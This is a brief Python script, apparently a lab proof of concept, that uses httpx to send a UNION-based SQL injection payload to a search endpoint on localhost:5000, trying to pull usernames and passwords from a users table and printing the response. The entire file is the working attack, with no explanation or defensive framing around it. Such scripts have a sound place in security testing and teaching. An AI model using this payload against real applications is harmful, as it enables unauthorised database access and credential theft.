
import httpx

def search_union_sqli():
    base_url = "http://localhost:5000/search"
    # Attempt UNION-based injection to extract username and password
    payload = "' UNION SELECT username, password FROM users -- "
    full_url = f"{base_url}?q={payload}"

    print(f"[+] Sending request to: {full_url}")
    r = httpx.get(full_url)
    print("[+] Response received:")
    print(r.text)

if __name__ == "__main__":
    search_union_sqli()
